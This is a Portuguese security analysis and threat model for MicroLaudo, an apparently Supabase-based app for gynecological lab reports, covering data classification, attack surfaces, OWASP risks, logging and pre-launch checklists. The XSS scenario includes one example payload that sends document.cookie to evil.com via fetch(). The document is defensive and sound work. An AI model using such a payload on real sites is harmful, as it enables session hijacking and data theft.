# Análise de Segurança — MicroLaudo

**Pragmática, priorizada por impacto real · Versão 1.0 · Abril 2026**

---

## 1. Dados Sensíveis e Classificação

Nem todo dado merece o mesmo nível de proteção. Aqui está o que temos, ordenado pelo estrago que um vazamento causaria:

### Impacto Crítico (vazamento = processo judicial + LGPD)

| Dado | Onde vive | Por que é crítico |
|------|-----------|-------------------|
| Nome do paciente + data de nascimento | tabela `reports`, dentro de cada laudo | Dado pessoal de saúde. LGPD Art. 11 — dado sensível. Vincula uma pessoa identificável a um exame ginecológico. Vazamento é notificação obrigatória à ANPD. |
| Fotos das lâminas | Supabase Storage (bucket `microscopy-photos`) | Embora sejam "só fotos de lâminas" e não identifiquem o paciente visualmente, estão vinculadas a um laudo que contém nome + data de nascimento. O conjunto é dado de saúde. |
| PDFs dos laudos | Supabase Storage (bucket `generated-pdfs`) | O laudo completo: nome do paciente, diagnóstico, fotos, assinatura do médico. É o dado mais sensível do sistema — um PDF vazado expõe tudo de uma vez. |

### Impacto Alto (vazamento = dano profissional ao médico)

| Dado | Onde vive | Por que importa |
|------|-----------|-----------------|
| CRM + RQE do médico | tabela `doctors` | Permite falsificação de identidade profissional. Alguém poderia gerar laudos falsos usando o CRM de outro médico. |
| Imagem da assinatura | Supabase Storage (bucket `signatures`) | Assinatura manuscrita digitalizada. Pode ser usada para forjar documentos. |
| CNPJ + dados da clínica | tabela `doctors` | Menos crítico sozinho, mas combinado com CRM permite engenharia social convincente. |

### Impacto Moderado (vazamento = incômodo, não catástrofe)

| Dado | Onde vive | Por que importa |
|------|-----------|-----------------|
| E-mail do médico | Supabase Auth (`auth.users`) | Permite phishing direcionado. "Seu plano MicroLaudo vai vencer, clique aqui para renovar." |
| Logo da clínica | Supabase Storage (bucket `clinic-logos`) | Imagem geralmente pública de qualquer forma. Baixo impacto isolado. |
| Status do plano / trial | tabela `doctors` | Se manipulado, dá acesso gratuito. Impacto financeiro, não de privacidade. |

---

## 2. Superfícies de Ataque

Superfície de ataque = todo ponto onde alguém de fora consegue interagir com o sistema. Para o MicroLaudo:

### Superfície 1: API do Supabase (REST/GraphQL)

**O que é:** O Supabase expõe automaticamente uma API REST (PostgREST) e opcionalmente GraphQL para todas as tabelas. Qualquer pessoa com a URL do projeto e a `anon key` pode fazer requests.

**Por que é perigosa:** A `anon key` do Supabase é pública (fica no código do app). Ela permite acesso à API — o que impede acesso indevido é exclusivamente o RLS (Row Level Security). Se uma policy RLS estiver mal configurada ou faltando, dados ficam expostos.

**Cenário concreto de ataque:** Atacante decompila o APK, extrai a `anon key` e a URL do Supabase, e faz requests diretas à API tentando listar dados de outros médicos.

### Superfície 2: Supabase Storage (buckets de imagem/PDF)

**O que é:** Os buckets armazenam fotos, logos, assinaturas e PDFs. Acesso deve ser via URLs assinadas (temporárias).

**Por que é perigosa:** Se o bucket for configurado como público por engano, qualquer pessoa com a URL base pode listar e baixar todos os arquivos — fotos de lâminas, PDFs de laudos, assinaturas de médicos.

**Cenário concreto:** Bucket `generated-pdfs` configurado como `public` em vez de `private`. Bots de indexação encontram a URL e indexam laudos no Google.

### Superfície 3: Edge Functions (webhooks de pagamento)

**O que é:** A Edge Function `payment-webhook` recebe eventos do RevenueCat e Stripe para atualizar o status da assinatura.

**Por que é perigosa:** Se não validar a origem do webhook, qualquer pessoa pode enviar um POST fake dizendo "este médico tem plano ativo" e burlar o paywall.

### Superfície 4: App distribuído (APK/IPA)

**O que é:** O app é distribuído nas lojas. O código JavaScript do React Native pode ser extraído e lido.

**Por que é perigoso:** Qualquer segredo hardcoded no app (API keys, URLs internas) é público. Não é possível esconder nada no client.

### Superfície 5: Autenticação (login/registro)

**O que é:** Formulário de login com e-mail/senha, Google e Apple.

**Por que é perigosa:** Brute force, credential stuffing (testar e-mails/senhas vazados de outros serviços), e criação em massa de contas para abusar do trial.

---

## 3. Top 5 Vetores de Ataque (OWASP adaptado ao MicroLaudo)

Priorizados por probabilidade × impacto real, não pela ordem da lista OWASP.

---

### #1 — Broken Access Control (OWASP A01:2021)
**Probabilidade:** Alta · **Impacto:** Crítico

**O que é no contexto do MicroLaudo:** Um médico consegue acessar laudos, fotos ou dados de outro médico. Isso acontece se alguma policy RLS estiver faltando, incompleta, ou se alguma tabela nova for criada sem RLS.

**Cenário real:**
1. Médico A loga no app normalmente.
2. Usando o DevTools do browser (versão web) ou interceptando a request, ele altera o `report_id` na chamada de API para o ID de um laudo do Médico B.
3. Se o RLS da tabela `reports` não filtrar por `doctor_id` → dados do paciente do Médico B vazam.

**Mitigações obrigatórias:**
- RLS ativo em **toda tabela** com `FORCE ROW LEVEL SECURITY` (impede bypass mesmo por service key acidental).
- Toda policy usa `auth.uid()` para filtrar. Nunca confiar em IDs vindos do client.
- Teste automatizado: criar 2 médicos, tentar acessar dados cruzados, verificar que retorna vazio.
- Buckets de Storage com policies RLS equivalentes (pasta por `user_id`).

**Checklist pré-deploy:**
```
[ ] Toda tabela tem RLS habilitado
[ ] Toda tabela tem policy SELECT, INSERT, UPDATE, DELETE usando auth.uid()
[ ] Buckets de Storage são PRIVADOS
[ ] Storage policies restringem upload/download por user_id
[ ] Teste cruzado: médico A não vê dados do médico B
```

---

### #2 — Injection via campos de texto livre (OWASP A03:2021)
**Probabilidade:** Média · **Impacto:** Alto

**O que é no contexto do MicroLaudo:** O laudo tem vários campos de texto livre — conclusão, descrição dos achados, referência bibliográfica, nome do paciente, nome do solicitante. Se esses campos forem renderizados sem sanitização, abrem vetor para XSS (no web) ou SQL injection (no banco).

**Cenário real (XSS):**
1. Médico preenche o campo "conclusão" com: `Flora normal <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>`.
2. Se a versão web renderizar esse campo com `dangerouslySetInnerHTML` ou sem escape, o script executa no browser de qualquer pessoa que visualizar o laudo.
3. No contexto do MicroLaudo, a vítima seria o próprio médico (ele vê seus laudos), então o impacto é mais limitado — mas se no futuro houver compartilhamento de laudos, escala.

**Cenário real (SQL Injection):**
- O Supabase usa PostgREST, que parametriza queries automaticamente. SQL injection via API REST do Supabase é praticamente impossível no uso normal. Risco real é baixo aqui.

**Mitigações obrigatórias:**
- Nunca usar `dangerouslySetInnerHTML` no React. Sempre renderizar texto como texto.
- Sanitizar inputs no client antes de enviar (remover tags HTML).
- No PDF (`@react-pdf/renderer`), texto é tratado como texto puro — sem risco de script execution. PDF é seguro nesse aspecto.
- Validar comprimento máximo de campos (nome do paciente: 200 chars; conclusão: 5000 chars) — evita também payloads absurdamente longos.

---

### #3 — Broken Authentication / Account Takeover (OWASP A07:2021)
**Probabilidade:** Média · **Impacto:** Alto

**O que é no contexto do MicroLaudo:** Alguém assume a conta do médico e ganha acesso a todos os laudos, dados de pacientes, assinatura digitalizada e CRM. Pode gerar laudos falsos com a identidade do médico.

**Vetores reais:**
- **Credential stuffing:** Médico usa o mesmo e-mail/senha que usou em outro serviço que já vazou. Atacante testa automaticamente.
- **Sem rate limiting no login:** Atacante faz brute force no endpoint de login do Supabase.
- **Sessão que não expira:** Se o token JWT não tiver expiração razoável, um token roubado (ex: de um celular perdido) dá acesso indefinido.

**Mitigações obrigatórias:**
- Supabase Auth já implementa rate limiting no login (configura em Dashboard → Auth → Rate Limits). Verificar que está ativo.
- Exigir senha com mínimo de 8 caracteres (Supabase Auth permite configurar).
- Confirmar e-mail antes de ativar a conta (Supabase Auth tem isso built-in, só habilitar).
- JWT com expiração de 1 hora (padrão do Supabase). Refresh token com expiração de 7 dias.
- Incentivar login via Google/Apple (delegam a segurança a provedores robustos com 2FA).

**Nice to have (v2):**
- MFA (Multi-Factor Authentication) — Supabase suporta TOTP. Não é prioridade na v1, mas valioso dado a sensibilidade dos dados.

---

### #4 — Burla do sistema de trial/pagamento
**Probabilidade:** Alta · **Impacto:** Financeiro (moderado)

**O que é no contexto do MicroLaudo:** O trial limita a 2 laudos. Se o sistema puder ser burlado, médicos usam o app indefinidamente sem pagar.

**Vetores reais:**
- **Múltiplas contas:** Criar conta com e-mail1@gmail, usar 2 laudos, criar conta com e-mail2@gmail, usar mais 2. Repetir.
- **Manipulação do client:** Se a verificação "trial_reports_used < 2" rodar apenas no client (JavaScript), basta modificar o código ou interceptar a response para sempre retornar `true`.
- **Webhook fake:** Enviar POST para a Edge Function `payment-webhook` com payload forjado dizendo que o médico pagou.

**Mitigações obrigatórias:**
- Verificação de trial no **servidor** (Edge Function `check-trial`), nunca no client. O client mostra a UI de bloqueio, mas a proteção real é server-side.
- Webhook do RevenueCat: validar assinatura HMAC do header `Authorization`. RevenueCat assina cada webhook com uma shared secret.
- Webhook do Stripe: validar `stripe-signature` header com `stripe.webhooks.constructEvent()`.
- Aceitar que múltiplas contas vão acontecer. Custo de prevenção (verificar telefone, documento) é maior que o prejuízo. 4 laudos grátis (2 contas) não substituem assinatura para uso real.

---

### #5 — Exposição acidental de Storage (OWASP A05:2021 — Security Misconfiguration)
**Probabilidade:** Média · **Impacto:** Crítico

**O que é no contexto do MicroLaudo:** Buckets de imagens ou PDFs configurados como públicos por erro. Todas as fotos de lâminas e laudos ficam acessíveis pela internet.

**Por que é provável:** O Supabase Dashboard permite alternar entre público e privado com um clique. Um erro durante desenvolvimento ou migração pode deixar um bucket exposto. Diferente de outros vetores, esse não requer atacante sofisticado — basta um bot crawleando URLs de Storage do Supabase.

**Mitigações obrigatórias:**
- Todos os 4 buckets PRIVADOS: `microscopy-photos`, `clinic-logos`, `signatures`, `generated-pdfs`.
- Acesso apenas via URLs assinadas (signed URLs) geradas pelo servidor com expiração curta (5-10 minutos).
- Storage policies que restringem operações por `auth.uid()`.
- Teste automatizado: tentar acessar URL do bucket sem token → deve retornar 403.
- Monitorar configuração de buckets. Se o Supabase oferecer alertas de mudança de policy, ativar.

**Checklist pré-deploy:**
```
[ ] Todos os buckets estão como PRIVATE
[ ] Nenhum bucket permite listagem pública
[ ] Storage policies usam auth.uid()
[ ] URLs assinadas expiram em <= 10 minutos
[ ] Teste: GET no bucket sem auth retorna 403
```

---

## 4. Autenticado vs. Público

O que precisa de login e o que não precisa:

### Público (sem autenticação)

| Recurso | Justificativa |
|---------|---------------|
| Tela de login e cadastro | Óbvio — o médico ainda não tem sessão. |
| Tela de planos e preços | O médico precisa ver o que vai pagar antes de criar conta. Muitos apps mostram preços sem login. |
| Landing page (versão web) | Página de marketing/conversão. Sem dados sensíveis. |
| Política de Privacidade e Termos de Uso | Exigência legal — devem ser acessíveis publicamente. |

### Autenticado (requer JWT válido)

| Recurso | Justificativa |
|---------|---------------|
| **Todo o resto** | Qualquer operação que envolva dados de paciente, fotos, laudos, perfil do médico, ou geração de PDF requer sessão autenticada. Não há exceção. |

A regra é simples: se a operação toca alguma tabela do banco ou algum bucket de Storage, exige autenticação. As 4 telas públicas são apenas UI informativa sem acesso a dados.

---

## 5. O que precisa de Logging

Logging custa dinheiro (armazenamento) e esforço (implementar, consultar). Priorizo pelo que realmente vou precisar consultar quando algo der errado.

### Obrigatório desde o dia 1

| Evento | O que logar | Por que |
|--------|------------|---------|
| **Login bem-sucedido** | user_id, método (e-mail/Google/Apple), timestamp, IP | Detectar account takeover (login de IP incomum). LGPD exige saber quem acessou dados pessoais. |
| **Login falhado** | e-mail tentado, método, timestamp, IP | Detectar brute force e credential stuffing. Se o mesmo e-mail tiver 50 falhas em 1 hora, algo está errado. |
| **Laudo finalizado** | report_id, doctor_id, timestamp, revision_number | Trilha de auditoria mínima. "Quando este laudo foi gerado? Foi revisado?" Essencial se houver questionamento do paciente. |
| **Laudo editado (re-aberto)** | report_id, doctor_id, timestamp, revision_number anterior | Saber que um laudo finalizado foi alterado. Proteção ética do médico — "eu corrigi um erro no dia X". |
| **Webhook de pagamento recebido** | provider (RevenueCat/Stripe), event_type, user_id, timestamp, sucesso/falha | Diagnosticar problemas de cobrança. "O médico diz que pagou mas o app está bloqueado" — o log do webhook mostra o que aconteceu. |
| **Falha de webhook (assinatura inválida)** | IP de origem, payload (sem dados sensíveis), razão da rejeição | Detectar tentativas de burla do paywall via webhook fake. |
| **Exclusão de conta** | user_id, timestamp | LGPD exige comprovação de que dados foram deletados quando solicitado. |

### Implementar quando tiver mais de 50 usuários

| Evento | O que logar | Por que |
|--------|------------|---------|
| Upload de imagem | doctor_id, bucket, tamanho do arquivo, timestamp | Detectar abuso de storage (uploads massivos, arquivos gigantes). |
| Acesso negado por RLS | query tentada, user_id, tabela, timestamp | Detectar tentativas de acessar dados de outros médicos. Indica ataque ativo ou bug de RLS. |
| Download de PDF | report_id, doctor_id, timestamp | Auditoria de acesso a laudos. |

### NÃO logar (risco > benefício)

| Evento | Por que NÃO |
|--------|------------|
| Conteúdo dos campos do laudo (nome do paciente, conclusão) | Dados sensíveis de saúde nos logs = mais um lugar para vazar. O log deve registrar que o laudo foi criado, não o que contém. |
| Fotos das lâminas | Binário grande, dado de saúde. Logs não são lugar para imagens. |
| Senha (mesmo em hash) | Óbvio, mas vale dizer: nunca logar senhas, nem hashes. Supabase Auth cuida disso internamente. |

### Onde armazenar os logs

Para a v1, o Supabase Dashboard já mostra logs de Auth e Edge Functions. Para logging customizado (laudo finalizado, laudo editado), criar uma tabela simples:

```
audit_log
  id: UUID
  event_type: TEXT        -- 'report.finalized', 'report.edited', 'account.deleted'
  actor_id: UUID          -- doctor.user_id
  resource_id: UUID       -- report_id (quando aplicável)
  metadata: JSONB         -- { revision: 2, method: "google" }
  ip_address: TEXT
  created_at: TIMESTAMPTZ
```

RLS nessa tabela: **somente INSERT** permitido pelo usuário. SELECT e DELETE apenas por service key (admin). Médico não pode apagar seus próprios logs.

---

## 6. Resumo Visual — Onde estão os riscos

```
┌─────────────────────────────────────────────────────────────┐
│                    DISPOSITIVO DO MÉDICO                     │
│                                                             │
│  ⚠️ App pode ser decompilado                                │
│     → Nunca guardar secrets no client                       │
│     → anon key é pública, proteção está no RLS              │
│                                                             │
│  ⚠️ Campos de texto livre (XSS)                             │
│     → Nunca usar dangerouslySetInnerHTML                    │
│     → Sanitizar inputs                                      │
│                                                             │
│  ⚠️ Verificação de trial no client pode ser burlada         │
│     → UI mostra bloqueio, mas proteção real é server-side   │
│                                                             │
└──────────────────────┬──────────────────────────────────────┘
                       │
                 HTTPS / TLS ✅ (protegido em trânsito)
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                       SUPABASE                              │
│                                                             │
│  🔴 RLS é a linha de defesa #1                              │
│     → Se falhar, tudo vaza                                  │
│     → Testar exaustivamente                                 │
│     → FORCE ROW LEVEL SECURITY em toda tabela               │
│                                                             │
│  🔴 Storage buckets DEVEM ser privados                      │
│     → Um clique errado no Dashboard = exposição total       │
│     → URLs assinadas com expiração curta                    │
│                                                             │
│  ⚠️ Webhooks de pagamento                                   │
│     → Validar HMAC/assinatura do provider                   │
│     → Nunca confiar em POST sem verificação                 │
│                                                             │
│  ⚠️ Auth: rate limiting e expiração de sessão               │
│     → Verificar config no Dashboard                         │
│     → JWT expira em 1h, refresh em 7d                       │
│                                                             │
│  ✅ SQL Injection: PostgREST parametriza tudo               │
│     → Risco real próximo de zero no uso normal              │
│                                                             │
└─────────────────────────────────────────────────────────────┘

🔴 = Risco crítico, verificar antes de cada deploy
⚠️ = Risco relevante, mitigar e monitorar
✅ = Risco baixo / já mitigado pela stack
```

---

## 7. Checklist de Segurança pré-lançamento

```
OBRIGATÓRIO ANTES DE IR PRA LOJA:

Auth
[ ] Confirmação de e-mail ativada
[ ] Rate limiting de login configurado
[ ] JWT expiration ≤ 1 hora
[ ] Refresh token expiration ≤ 7 dias
[ ] Apple Sign-In implementado (exigência App Store)

Banco (RLS)
[ ] TODA tabela: ALTER TABLE x ENABLE ROW LEVEL SECURITY
[ ] TODA tabela: ALTER TABLE x FORCE ROW LEVEL SECURITY
[ ] TODA policy usa auth.uid(), nunca IDs do client
[ ] Teste cruzado: médico A não acessa dados do médico B
[ ] Tabela audit_log: INSERT only para users

Storage
[ ] Todos os buckets configurados como PRIVATE
[ ] Storage policies restringem por auth.uid()
[ ] URLs assinadas com expiração ≤ 10 minutos
[ ] Teste: GET sem token retorna 403

Pagamentos
[ ] Webhook RevenueCat: validação HMAC ativa
[ ] Webhook Stripe: validação stripe-signature ativa
[ ] Edge Function check-trial: roda no servidor
[ ] Teste: POST fake no webhook é rejeitado

Client
[ ] Nenhum secret além da anon key no código
[ ] Nenhum uso de dangerouslySetInnerHTML
[ ] Validação de comprimento em campos de texto
[ ] Versão mínima de TLS: 1.2

LGPD
[ ] Política de Privacidade publicada e acessível
[ ] Termos de Uso publicados
[ ] Funcionalidade "Excluir minha conta" implementada
[ ] Exclusão remove: perfil + laudos + fotos + PDFs + logs vinculados
[ ] Nenhum dado de paciente em logs
```

---

*Última atualização: 18 de abril de 2026*
*Revisitar quando: adicionar nova tabela, novo bucket, novo endpoint público, ou ultrapassar 50 usuários.*
